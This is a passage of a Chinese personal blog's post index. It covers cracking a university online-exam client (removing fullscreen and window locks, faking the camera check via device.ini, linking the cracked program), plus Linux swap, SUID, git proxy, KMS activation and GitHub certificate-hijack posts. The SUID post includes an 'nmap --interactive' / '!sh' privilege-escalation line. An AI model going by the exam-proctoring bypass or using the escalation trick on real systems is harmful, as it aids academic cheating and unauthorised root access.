","date":"2020-05-01","objectID":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/:2:4","tags":["reverse","sdu","coding","crack"],"title":"逆向破解学校在线考试客户端","uri":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/"},{"categories":["reverse"],"content":"去除强制全屏 下面我们来去除一下窗口全屏，虽然有任务栏可以用了，但是全屏会挡住，不好用 还是刚刚那个函数，通过不断查交叉应用，最后定位到start第二次jmp后的代码中 通过前面对前前后后的call和跳转的分析，可以知道没有啥具体内容，所以还得从刚刚的那个函数入手 发现后面有一个call 进入后 发现这个函数是要将之前设置的任务栏隐藏等给还原，所以这里应该是要退出了，重要的内容还是在杀死qq的那些操作和这个函数中间的位置 仔细分析后，找到了关键的地方 这和函数在最后面会获取主屏幕的长和宽，然后调用resize函数设置窗口大小，从而使窗口占满屏幕 这里看一下汇编 其实还是比较难搞的，东西比较紧凑，没法插入太多的汇编，又不想进行大改增加一个call，那就只把开始菜单的地方留出来吧，也就是只修改窗口的高 因为需要先把高入栈，所以前面的宽先存到 esi，我们先不要动这个，先把高减一个数然后push进去再push esi，修改之后如下 这样显示的窗口就不会挡住任务栏，我们就可以切换窗口了 ","date":"2020-05-01","objectID":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/:2:5","tags":["reverse","sdu","coding","crack"],"title":"逆向破解学校在线考试客户端","uri":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/"},{"categories":["reverse"],"content":"恢复窗口和按钮 后来又想，如果可以手动修改窗口大小就好了，再有个放大、缩小的按钮并且能移动位置就更爽了，那就接着搞 之前做过qt的开发，知道有一个窗口属性是可以隐藏系统窗口，只显示里面的内容从而使窗口无法修改大小和移动位置 搜索一番后发现使用的使 setWindowFlags 函数来实现的，那就从imports里面找一下吧 看交叉引用然后一个一个进去看，最后定位到一个函数，我给他起名 initWindowsComponent，前面的分析我也都相应的进行改名了，分析起来方便记忆 我这个起名应该是非常贴切了，的确是往窗口里面添加各种菜单按钮组件 在后面找到了setWindowFlags调用，但是因为qt里面用的是枚举类型，编译后都变成数字了，只能去看qt的源码 传入的枚举类型使WindowsFlags类型，跟进去后发现又是一个WindowType类型 再接着跟进，就看到了全部的内容 2048换成16进制是0x800 根据代码是无边框类型 我们需要的是有边框有放大缩小和关闭按钮，所以需要的类型是 此时还没有关闭按钮，根据计算方式，还需要或上关闭按钮的值 修改这个参数后窗口就可以随意移动、修改大小、缩小或者全屏了。 ","date":"2020-05-01","objectID":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/:2:6","tags":["reverse","sdu","coding","crack"],"title":"逆向破解学校在线考试客户端","uri":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/"},{"categories":["reverse"],"content":"绕过摄像头检查 我们还知道这个程序还必须要摄像头检查通过，通过简单的实验，发现摄像头只需要检查通过一次，后面不会重复检查，只会读取device.ini文件，所以我们增加这个文件，并手动指定检查通过 同时通过搜索字符串查看交叉引用可以找到需要读取或者写入文件的地方，这里没有深入研究了，谁敢兴趣谁去研究 ","date":"2020-05-01","objectID":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/:2:7","tags":["reverse","sdu","coding","crack"],"title":"逆向破解学校在线考试客户端","uri":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/"},{"categories":["reverse"],"content":"其他地方 在对这个程序探究的过程中，还发现了tab栏和menu栏可以打开显示，但是实际作用不大，就没有管。 同时通过burp抓包和测试，找到了在线考试的登录接口并发现普通浏览器可以正常使用 同时通过对相关接口的测试，找到了任意密码修改和个人信息泄露的漏洞 ","date":"2020-05-01","objectID":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/:2:8","tags":["reverse","sdu","coding","crack"],"title":"逆向破解学校在线考试客户端","uri":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/"},{"categories":["reverse"],"content":"申明与文件 同时本次研究完全以学习为目的，不得将上述内容用作商业或非法，否则一切后果由用户负责。您必须在下载后的24个小时之内，从您的电脑中彻底删除上述内容。 破解之后的程序 {% asset_link 线上考试.zip [点击下载] %} ","date":"2020-05-01","objectID":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/:3:0","tags":["reverse","sdu","coding","crack"],"title":"逆向破解学校在线考试客户端","uri":"https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/"},{"categories":["coding"],"content":"给 linux 服务器添加swap做了好几次了，每一次都没记住，临时去网上查命令，这里特地记录一下 ","date":"2020-04-12","objectID":"https://lgf.im/posts/linux/linux-add-swap/:0:0","tags":["linux","swap"],"title":"Linux添加swap","uri":"https://lgf.im/posts/linux/linux-add-swap/"},{"categories":["coding"],"content":"查看当前swap sudo swapon --show 如果没有输出说明没有swap 也可以通过free命令来查看 free -h ","date":"2020-04-12","objectID":"https://lgf.im/posts/linux/linux-add-swap/:1:0","tags":["linux","swap"],"title":"Linux添加swap","uri":"https://lgf.im/posts/linux/linux-add-swap/"},{"categories":["coding"],"content":"添加swap 添加swap基本步骤： 创建一个大文件 -\u003e 初始化文件为swap交换文件格式 -\u003e 启用这个文件 ","date":"2020-04-12","objectID":"https://lgf.im/posts/linux/linux-add-swap/:2:0","tags":["linux","swap"],"title":"Linux添加swap","uri":"https://lgf.im/posts/linux/linux-add-swap/"},{"categories":["coding"],"content":"创建大文件 先找一个剩余空间大点的地方创建一个大文件，这里以1G的大小为例，一般swap空间大小以真实物理内存1-2倍大小 # 我喜欢用的方法，速度快 sudo fallocate -l 1G /swapfile # 如果没有安装可以用dd命令，比较慢 sudo dd if=/dev/zero of=/swapfile bs=1024 count=1048576 修改文件的权限 sudo chmod 600 /swapfile ","date":"2020-04-12","objectID":"https://lgf.im/posts/linux/linux-add-swap/:2:1","tags":["linux","swap"],"title":"Linux添加swap","uri":"https://lgf.im/posts/linux/linux-add-swap/"},{"categories":["coding"],"content":"初始化文件 创建完文件后需要将文件进行初始化，标记为swap文件格式 sudo mkswap /swapfile ","date":"2020-04-12","objectID":"https://lgf.im/posts/linux/linux-add-swap/:2:2","tags":["linux","swap"],"title":"Linux添加swap","uri":"https://lgf.im/posts/linux/linux-add-swap/"},{"categories":["coding"],"content":"启用swap 接下来使用 命令启用这个swap交换文件 sudo swapon /swapfile 要让创建好的 swap 分区永久生效，可以将 swapfile 路径内容写入到 /etc/fstab 文件当中： /swapfile swap swap defaults 0 0 ","date":"2020-04-12","objectID":"https://lgf.im/posts/linux/linux-add-swap/:2:3","tags":["linux","swap"],"title":"Linux添加swap","uri":"https://lgf.im/posts/linux/linux-add-swap/"},{"categories":["coding"],"content":"检查 用一开始的命令检查一下swap是否启用正常 ","date":"2020-04-12","objectID":"https://lgf.im/posts/linux/linux-add-swap/:2:4","tags":["linux","swap"],"title":"Linux添加swap","uri":"https://lgf.im/posts/linux/linux-add-swap/"},{"categories":["coding"],"content":"移除SWAP分区 根据添加的顺序反着来就行： 取消swap -\u003e 删除swap分页文件 ","date":"2020-04-12","objectID":"https://lgf.im/posts/linux/linux-add-swap/:3:0","tags":["linux","swap"],"title":"Linux添加swap","uri":"https://lgf.im/posts/linux/linux-add-swap/"},{"categories":["coding"],"content":"取消swap 首先输入以下命令停用 SWAP 空间： sudo swapoff -v /swapfile 在 /etc/fstab 文件中删除有效 swap 的行。 ","date":"2020-04-12","objectID":"https://lgf.im/posts/linux/linux-add-swap/:3:1","tags":["linux","swap"],"title":"Linux添加swap","uri":"https://lgf.im/posts/linux/linux-add-swap/"},{"categories":["coding"],"content":"删除文件 最后执行以下命令删除 swapfile 文件： sudo rm /swapfile ","date":"2020-04-12","objectID":"https://lgf.im/posts/linux/linux-add-swap/:3:2","tags":["linux","swap"],"title":"Linux添加swap","uri":"https://lgf.im/posts/linux/linux-add-swap/"},{"categories":["coding"],"content":"调整Swappiness值 Swappiness 是一个 Linux 内核属性，用于定义 Linux 系统使用 SWAP 空间的频率。Swappiness 值可以从 0 至 100，较低的值会让内核尽可能少的使用 SWAP 空间，而较高的值将让 Linux Kernel 能够更加积极地使用 SWAP 分区。 Ubuntu 18.04 默认的 Swappiness 值为 60，您可以使用如下命令来查看： cat /proc/sys/vm/swappiness 值为 60 对于 Ubuntu 18.04 桌面还算行，但对于 Ubuntu Server 来说，SWAP 的使用频率就比较高了，所以您可能需要设置较低的值。例如，要将 swappiness 值设置为 40，请执行： sudo sysctl vm.swappiness=40 如果要让设置在系统重启后依然有效，则必要在 /etc/sysctl.conf 文件中添加以下内容： vm.swappiness=40 最佳 swappiness 值取决于您系统的工作负载以及内存的使用方式，您应该以小增量的方式来调整此参数，以查到最佳值。 ","date":"2020-04-12","objectID":"https://lgf.im/posts/linux/linux-add-swap/:4:0","tags":["linux","swap"],"title":"Linux添加swap","uri":"https://lgf.im/posts/linux/linux-add-swap/"},{"categories":["coding"],"content":"UCloud已经对加速IP进行限制，本文中的方法即时失效 通知内容如下： 尊敬的UCloud用户，您好！ GlobalSSH产品即日起将暂时限制服务器IP地址范围， 仅允许添加UCloud平台上的IP地址，已创建的资源仍然可继续使用。 GlobalSSH版本与功能支持将持续更新，敬请关注。 由于众所周知的原因，很多国外的服务器在国内的访问效果很差，特别是国内比较热门的廉价服务器例如 Vultr 就经常被墙直接无法访问 通常情况下我会使用ssr等代理服务进行中转，在我经常使用的 MobaXterm 中设置起来也非常方便 但是这种方法有两大劣势： 如果科学上网服务器不稳定经常断流就会导致ssh连接断开 部分客户端不支持设置http或者socks代理 ","date":"2020-04-12","objectID":"https://lgf.im/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/:0:1","tags":["ucloud","ssh","coding"],"title":"使用GlobalSSH服务加速境外服务器ssh访问","uri":"https://lgf.im/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/"},{"categories":["coding"],"content":"GlobalSSH 今天发现了一个免费的加速服务，非常方便，推荐给需要的人 这就是 UCloud 免费提供的 GlobalSSH 加速服务 官网链接： https://console.ucloud.cn/upathx/globalssh 官方文档： https://docs.ucloud.cn/pathx/globalssh 这项服务目前是免费的，也不需要进行实名认证 现在需要实名认证才能用了，可以说是非常良心了，经过我的试用，访问速度和稳定性非常不错 支持ssh和rdp远程桌面，猜测有一些其他的服务可以加速，因为是针对端口加速的，但是如果滥用的话可能被封禁 在创建的时候只需要输入需要加速的国外服务器的ip和服务端口号，选择一个离服务器近的接入点 创建之后会提供一个域名，可以将自己的域名CNAME解析到提供的域名上方便记忆，UCLOUD可以准确识别到是访问哪一台服务器 在我们使用的客户端上只需要用提供的加速域名和原服务端口号就可以了 ","date":"2020-04-12","objectID":"https://lgf.im/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/:1:0","tags":["ucloud","ssh","coding"],"title":"使用GlobalSSH服务加速境外服务器ssh访问","uri":"https://lgf.im/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/"},{"categories":["coding"],"content":"注意事项 自产品实例创建之日起，7日内单个实例累计出向流量小于2MB，加速功能将被停用，所以一开始先多用点吧 每个源IP只能加速一个端口 加速流量上限官方未注明，滥用的话会被封 ","date":"2020-04-12","objectID":"https://lgf.im/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/:2:0","tags":["ucloud","ssh","coding"],"title":"使用GlobalSSH服务加速境外服务器ssh访问","uri":"https://lgf.im/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/"},{"categories":["coding"],"content":"妙用 众所周知，github在国内的访问速度很慢，有时候clone一个库不得不忍受十几k几十k每秒的速度 而git是可以用ssh协议的，所以我们只需要从 https://api.github.com/meta 找到github使用的ip，通过GlobalSSH加速22端口，然后将自己的域名解析到加速的ip，最后使用自己的域名clone就行了 经过我的尝试效果还不错，可以跑到10Mbps 我用的域名为 githubssh.xyz ，大家可以拿去用，使用方法如下： 原命令 git clone git@github.com:moby/moby.git 替换后 git clone git@githubssh.xyz:moby/moby.git 为了能够自动更新ip，我写了一个程序，每天会检查github新的ip，创建新的globalssh，然后自动解析到域名githubssh.xyz上，由cloudflare进行DNS层面的负载均衡 开源地址为： https://github.com/zu1k/globalssh4github 同时为了方便，改了一个插件： https://chrome.google.com/webstore/detail/github%E5%8A%A0%E9%80%9F/kejahdakjmkfddgnifodfnpcklckjjpo ","date":"2020-04-12","objectID":"https://lgf.im/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/:3:0","tags":["ucloud","ssh","coding"],"title":"使用GlobalSSH服务加速境外服务器ssh访问","uri":"https://lgf.im/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/"},{"categories":["share"],"content":"这是一个无聊的，老生常谈的话题 我个人笔记本是自带的正版windows，但是在虚拟机里面的win却没有正版，我一般会用kms进行激活 github搜索kms会找到很多版本的kms激活服务端，比较出名的是这一个，可以一键运行起来：https://github.com/Wind4/vlmcsd 相关的脚本啊，命令啊，在百度一搜一大堆，就不重复写了 分享一点我想说的，我的做法把用自己的域名cname解析网上搜到的kms服务器地址，然后用自己的域名进行激活。 因为你永远不知道他们提供的服务什么时候会中止或者域名什么时候会到期，像我这样有多个不同的虚拟机，如果这种事情发生我就需要打开每一个虚拟机分别重新运行激活脚本进行重新激活，这就很麻烦。 而用自己的域名的话，我只需要找一个好用的kms服务器然后修改dns的解析就行了，省了很多事 我自己用的激活脚本： https://gist.github.com/zu1k/612dd4b0a0193620d43c08a698e05d85 ","date":"2020-04-08","objectID":"https://lgf.im/posts/share/kms/:0:0","tags":["kms"],"title":"kms激活","uri":"https://lgf.im/posts/share/kms/"},{"categories":["life"],"content":" 这应该是我第一篇记录生活的博文吧，之前一直是写一些学习、技术相关的文章，总感觉博客不应该只记录这些东西，那就开始吧 妈妈从网上买了几斤红薯，今天突然说想吃，那就用烤箱烤一下吧 ","date":"2020-03-31","objectID":"https://lgf.im/posts/life/bake-sweet-potato/:0:0","tags":["cooking","bake"],"title":"烤红薯","uri":"https://lgf.im/posts/life/bake-sweet-potato/"},{"categories":["life"],"content":"准备 烤盘铺上锡纸（哑光面接触食物），红薯洗净不去皮，均匀的摆放到烤盘上 烤箱230度预热10分钟后就可以将烤盘放入了 ","date":"2020-03-31","objectID":"https://lgf.im/posts/life/bake-sweet-potato/:1:0","tags":["cooking","bake"],"title":"烤红薯","uri":"https://lgf.im/posts/life/bake-sweet-potato/"},{"categories":["life"],"content":"第一波 230度先烤30分钟，呼叫小爱：“小爱同学，30分钟后叫我” 30分钟不到（大约20多分钟吧）就闻到红薯的香气飘出来了，香啊 30分钟后打开烤箱，用夹子夹着给每个红薯翻个个 烤了半个小时的红薯朝上的那面有点软，但是没有怎么变色，接触锡纸的一面有点变黑了，焦感出来了 翻完个后拍了三张照片，可以看到整体还是不错的，火候还不到，有的地方已经流出油来了 ","date":"2020-03-31","objectID":"https://lgf.im/posts/life/bake-sweet-potato/:2:0","tags":["cooking","bake"],"title":"烤红薯","uri":"https://lgf.im/posts/life/bake-sweet-potato/"},{"categories":["life"],"content":"第二波 鉴于红薯个比较大，翻个后时间增加到45分钟，接着烤 中途没忍住，打开拍了一张照片，流了很多油啊，接触到烤盘发出滋滋的响声，很是诱人 ","date":"2020-03-31","objectID":"https://lgf.im/posts/life/bake-sweet-potato/:3:0","tags":["cooking","bake"],"title":"烤红薯","uri":"https://lgf.im/posts/life/bake-sweet-potato/"},{"categories":["life"],"content":"出炉 时间到，啥也不说了，直接看图吧 超级好吃，超级甜，超级香 ","date":"2020-03-31","objectID":"https://lgf.im/posts/life/bake-sweet-potato/:4:0","tags":["cooking","bake"],"title":"烤红薯","uri":"https://lgf.im/posts/life/bake-sweet-potato/"},{"categories":["life"],"content":"补充 这次因为是第一次烤，烤的时间稍微有点长，流出来太多油浪费了，还有一些油都烤糊了，下次会缩短一点时间 ","date":"2020-03-31","objectID":"https://lgf.im/posts/life/bake-sweet-potato/:5:0","tags":["cooking","bake"],"title":"烤红薯","uri":"https://lgf.im/posts/life/bake-sweet-potato/"},{"categories":["coding"],"content":"什么是SUID SUID简称位，英文全称是Set owner User ID up on execution，它是一种特殊的文件权限，能够让用户(如Bob)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权 同一类的还有SGID，就不详细说了，原理与SUID一样，就以SUID为例 在一个程序执行的时候会有三个ID状态，在深入学习SUID之前必须能够区分下面三种ID： Real User ID Effective User ID Saved User ID Real User ID 是执行这个程序的用户的真实ID，是已用户login时候的ID为准 Effective User ID 是程序执行过程中使用权限时真正起作用的用户ID，操作系统在检查一个程序有没有某个权限的时候会看这个ID Saved User ID 是程序临时提权时需要保存的先前的用户ID，等提权结束后需要回退到这个用户ID ","date":"2020-03-30","objectID":"https://lgf.im/posts/linux/linux-suid/:1:0","tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://lgf.im/posts/linux/linux-suid/"},{"categories":["coding"],"content":"SUID的作用 如果用户user2有另一个用户user1的程序的执行权限，并且user1给这个程序设置了SUID位，那么user2就可以用user1的权限来执行这个程序 简单来说，SUID能够让用户(如Bob)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权 举个例子： 所有用户的密码保存在 /etc/shadow 文件中，但是这个文件只有root用户能够进行写操作 root@kali:~# ls -l /etc/shadow -rw-r----- 1 root shadow 1639 Jan 27 12:50 /etc/shadow 那如果普通用户想要修改自己的密码，是否需要让root用户帮着修改呢？ 显然不需要，修改密码用到了 /usr/bin/passwd 这个程序，我们来看一下它的权限 root@kali:~# ls -l /usr/bin/passwd -rwsr-xr-x 1 root root 63944 Dec 20 10:39 /usr/bin/passwd 可以看到，这个程序的所有者是root用户，但是所有用户都有执行权限，并且设置了s位（怎么看出来的后面会说） 这样SUID机制就会在程序执行的时候发生作用，让普通用户可以用root权限修改/etc/shadow文件 SUID机制的存在使程序权限的控制更加方便，用户可以执行某个程序而不需要登录到程序拥有者的账号 ","date":"2020-03-30","objectID":"https://lgf.im/posts/linux/linux-suid/:2:0","tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://lgf.im/posts/linux/linux-suid/"},{"categories":["coding"],"content":"如何使用SUID ","date":"2020-03-30","objectID":"https://lgf.im/posts/linux/linux-suid/:3:0","tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://lgf.im/posts/linux/linux-suid/"},{"categories":["coding"],"content":"查看SUID 通过命令 ls -l 即可看到文件的详细信息，包括权限表 -rwxrwxrwx - rwx rwx rwx 第一位是文件类型，-就是普通文件，d代表目录，l代表链接文件，还有一些其他类型的文件不详细说了 后面的9位可以分成三组，分别表示所有者权限、同组内用户权限，组外其他用户权限 每一组都有三位，r 代表有读取权限，w 代表有写入权限，x 代表有执行权限，如果是 _ 就代表没有相应的权限 如果文件所有者权限的 x 换成 s 就代表设置了SUID 同理如果组内用户权限的 x 换成了 s 就代表设置了SGID ","date":"2020-03-30","objectID":"https://lgf.im/posts/linux/linux-suid/:3:1","tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://lgf.im/posts/linux/linux-suid/"},{"categories":["coding"],"content":"设置SUID 使用 chmod 4000 filename 可以设置SUID位 使用 chmod 2000 filename 可以设置SGID位 使用 chmod 6000 filename 可以同时设置SGID和SUID位 注意: 2000\\4000\\6000都是不完整的权限，正常使用应该将000替换为相应的权限，例如 4755 ","date":"2020-03-30","objectID":"https://lgf.im/posts/linux/linux-suid/:3:2","tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://lgf.im/posts/linux/linux-suid/"},{"categories":["coding"],"content":"取消SUID 使用 chmod 755 filename 可以取消SGID和SUID位 或者 chmod u-s filename or chmod g-s filename 也可以 ","date":"2020-03-30","objectID":"https://lgf.im/posts/linux/linux-suid/:3:3","tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://lgf.im/posts/linux/linux-suid/"},{"categories":["coding"],"content":"SUID提权 因为SUID位让程序在执行的时候有了所有者的权限，所以可以利用这点来提权 示例： # 进入nmap的交互模式 nmap --interactive # 执行sh，提权成功 !sh 详细介绍见： https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html ","date":"2020-03-30","objectID":"https://lgf.im/posts/linux/linux-suid/:4:0","tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://lgf.im/posts/linux/linux-suid/"},{"categories":["coding"],"content":"SUID在脚本中失效 假如user1用 chmod 4777 /home/user1/script.sh 命令给script.sh脚本设置SUID位，登录user2后执行这个脚本提示没有权限 这是因为SUID位只对编译过的可执行程序起作用，sh脚本的实际执行程序是sh或者bash之类，如果它们在执行的时候并不会检查脚本文件的SUID位，那就不会起作用了 Perl执行器会检查perl脚本的suid位，所以可以给pl脚本设置suid位 ","date":"2020-03-30","objectID":"https://lgf.im/posts/linux/linux-suid/:5:0","tags":["linux","suid","coding"],"title":"学习Linux中的SUID机制","uri":"https://lgf.im/posts/linux/linux-suid/"},{"categories":["coding"],"content":"近期，Github的直连速度一直不理想，甚至被墙或者MITM，最好的解决办法就是挂代理 Git 可以使用四种不同的协议来传输资料：本地协议（Local），HTTP 协议，SSH（Secure Shell）协议及 Git 协议 而我们平时使用github一般使用两种协议，一种是http协议，另一种是ssh协议，针对这两种协议有两种不同的代理设置办法 ","date":"2020-03-27","objectID":"https://lgf.im/posts/coding/set-proxy-for-git/:0:0","tags":["proxy","github","git"],"title":"给git设置代理","uri":"https://lgf.im/posts/coding/set-proxy-for-git/"},{"categories":["coding"],"content":"http协议 通常使用的链接形如：https://github.com/git/git.git 针对这种协议，代理设置比较简单 # http或https代理 git config --global https.proxy http://127.0.0.1:1080 git config --global https.proxy https://127.0.0.1:1080 # 取消代理 git config --global --unset http.proxy git config --global --unset https.proxy ","date":"2020-03-27","objectID":"https://lgf.im/posts/coding/set-proxy-for-git/:1:0","tags":["proxy","github","git"],"title":"给git设置代理","uri":"https://lgf.im/posts/coding/set-proxy-for-git/"},{"categories":["coding"],"content":"ssh协议 通常使用的链接形如：git@github.com:git/git.git 或者 ssh://[\u003cusername\u003e@]\u003cserver\u003e[:\u003cport\u003e]/path/repo.git 对于使用ssh协议的库，上面的代理设置办法就失效了，需要给ssh设置socks代理 在 ~/.ssh/config 文件中添加下面内容， 如果没有这个文件就新建 Host github.com ProxyCommand nc -X 5 -x 127.0.0.1:1080 %h %p 这里使用的是nc命令，linux需要安装netcat(一般自带了)，windows需要单独下载 windows如果安装了mingw也可以使用connect命令来替代nc命令 Host github.com ProxyCommand connect -S 127.0.0.1:1080 %h %p 补充： 详见 https://blog.lgf.im/2020/use-ucloud-globalssh-to-speedup-server-ssh.html 可以通过 GlobalSSH 的海外加速服务来加速github的访问，经过我的尝试效果还不错，可以跑到10Mbps 我用的域名为 zll.us ，大家可以拿去用，使用方法如下： 原命令 git clone git@github.com:moby/moby.git 替换后 git clone git@zll.us:moby/moby.git ","date":"2020-03-27","objectID":"https://lgf.im/posts/coding/set-proxy-for-git/:2:0","tags":["proxy","github","git"],"title":"给git设置代理","uri":"https://lgf.im/posts/coding/set-proxy-for-git/"},{"categories":["coding"],"content":"昨天下午两点多，突然在一个站长群里听到有人说 Github Pages 的证书大批量出现错误，不一会就在V2EX上看到相关讨论的帖子 当天晚上再次刷V2EX的时候发现部分cloudflare的IP和京东主站部分IP也出现相似的劫持事件 今天早晨8点左右，在V2EX上发现有人讨论 Github 主站出现相同的https劫持，不经过代理访问发现证书的确异常 查看证书详情 ","date":"2020-03-27","objectID":"https://lgf.im/posts/events/mitm-https-hijack-github/:0:0","tags":["github","MITM","https","hijack"],"title":"Github等大面积https劫持","uri":"https://lgf.im/posts/events/mitm-https-hijack-github/"},{"categories":["coding"],"content":"检查Github证书 这里我通过北京和香港两台阿里云主机，使用openssl提供的方法查看证书详细内容 命令为: openssl s_client -showcerts -connect github.com:443 \u003c /dev/null ","date":"2020-03-27","objectID":"https://lgf.im/posts/events/mitm-https-hijack-github/:1:0","tags":["github","MITM","https","hijack"],"title":"Github等大面积https劫持","uri":"https://lgf.im/posts/events/mitm-https-hijack-github/"},{"categories":["coding"],"content":"北京阿里云 点击展开 ➜ ~ openssl s_client -showcerts -connect github.com:443 \u003c /dev/null CONNECTED(00000003) depth=1 C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com verify error:num=19:self signed certificate in certificate chain verify return:1 depth=1 C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com verify return:1 depth=0 C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = SERVER, emailAddress = 346608453@qq.com verify return:1 --- Certificate chain 0 s:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = SERVER, emailAddress = 346608453@qq.com i:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com -----BEGIN CERTIFICATE----- MIIB4TCCAYcCFDjGwZUOfrr1+SWHR5GxJ/rwXsHZMAoGCCqGSM49BAMCMHExCzAJ BgNVBAYTAkNOMQswCQYDVQQIDAJHRDELMAkGA1UEBwwCU1oxDDAKBgNVBAoMA0NP TTEMMAoGA1UECwwDTlNQMQswCQYDVQQDDAJDQTEfMB0GCSqGSIb3DQEJARYQMzQ2 NjA4NDUzQHFxLmNvbTAeFw0xOTA5MjYwOTMzMTNaFw0yOTA5MjMwOTMzMTNaMHUx CzAJBgNVBAYTAkNOMQswCQYDVQQIDAJHRDELMAkGA1UEBwwCU1oxDDAKBgNVBAoM A0NPTTEMMAoGA1UECwwDTlNQMQ8wDQYDVQQDDAZTRVJWRVIxHzAdBgkqhkiG9w0B CQEWEDM0NjYwODQ1M0BxcS5jb20wWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAASJ 27aMaVclvmdT8m6l98K999FM4dYTg4ag0627S2bxbLYHyLdQ0jqay5kA9KCF9Ucw uzcqtTrNERlLIsxDGkLjMAoGCCqGSM49BAMCA0gAMEUCIH1+jEiQTVA+siP2g9kw ITFZZINVKyET48788OSCLK1hAiEA+c5bJvnrdtZ1rbsLXJWtglkXSeBaHy5Wdt7w dGc7McM= -----END CERTIFICATE----- 1 s:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com i:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com -----BEGIN CERTIFICATE----- MIICNzCCAd2gAwIBAgIUD6UJah0ReDrJIuxhqrTa0CAAbAMwCgYIKoZIzj0EAwIw cTELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjEMMAoGA1UE CgwDQ09NMQwwCgYDVQQLDANOU1AxCzAJBgNVBAMMAkNBMR8wHQYJKoZIhvcNAQkB FhAzNDY2MDg0NTNAcXEuY29tMB4XDTE5MDkyNjA5MzIzN1oXDTI5MDkyMzA5MzIz N1owcTELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjEMMAoG A1UECgwDQ09NMQwwCgYDVQQLDANOU1AxCzAJBgNVBAMMAkNBMR8wHQYJKoZIhvcN AQkBFhAzNDY2MDg0NTNAcXEuY29tMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE qZ26n2ml6hcyf+NS0TP8PSZ1qlFzUb/tpr6Wb6zE9cSzkGOXej0ddI3sNvq/bLzk LLvaQLEzaIFyRDY6fcSQ36NTMFEwHQYDVR0OBBYEFKv8Ri5sjN4WZoaWvK/h9Yf+ zhVyMB8GA1UdIwQYMBaAFKv8Ri5sjN4WZoaWvK/h9Yf+zhVyMA8GA1UdEwEB/wQF MAMBAf8wCgYIKoZIzj0EAwIDSAAwRQIhANFUxlZxx3dfmxEu1I0huK9eY/IPl6Xz AsUXUQZN2QPXAiACddgQK7I4I86sjPwjCMafPES9LkV/whcFV60LlAftaQ== -----END CERTIFICATE----- --- Server certificate subject=C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = SERVER, emailAddress = 346608453@qq.com issuer=C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: ECDSA Server Temp Key: X25519, 253 bits --- SSL handshake has read 1499 bytes and written 395 bytes Verification error: self signed certificate in certificate chain --- New, TLSv1.2, Cipher is ECDHE-ECDSA-AES128-GCM-SHA256 Server public key is 256 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-ECDSA-AES128-GCM-SHA256 Session-ID: 1A4A06D58F5DCC0FA80FFE4125AC12E555126BF8B7C7C627210B9C36F3B5A6ED Session-ID-ctx: Master-Key: 6BD176466BF93E52D592216063276369497FA26AFF0E7343A872FFA6E3F12BFF611BFDA4F5994F297ECC5772EE812305 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 7a 4c 52 3b d5 f6 1c c4-ea 0d 86 45 37 1a 57 c4 zLR;.......E7.W. 0010 - a5 47 0e 76 87 9f f1 68-ac 6c 37 e3 02 87 61 77 .G.v...h.l7...aw 0020 - d9 c5 6a 65 88 3c 44 e5-17 59 5e 30 de 55 51 4a ..je.\u003cD..Y^0.UQJ 0030 - f4 9e 51 c9 35 ee ff a9-62 60 a2 7d 63 fc c1 f9 ..Q.5...b`.}c... 0040 - a4 bf 41 c5 2f 42 9a 7c-6d b0 99 49 63 1c 0f 5c ..A./B.|m..Ic..\\ 0050 - 37 ce 32 85 e6 fb 49 5a-01 97 9d 23 6c c6 9e b3 7.2...IZ...#l... 0060 - 56 dc ae c6 76 cf c6 ba-95 16 c6 c8 57 d1 be c7 V...v.......W... 0070 - d0 a3 f9 66 c6 4e a9 99-52 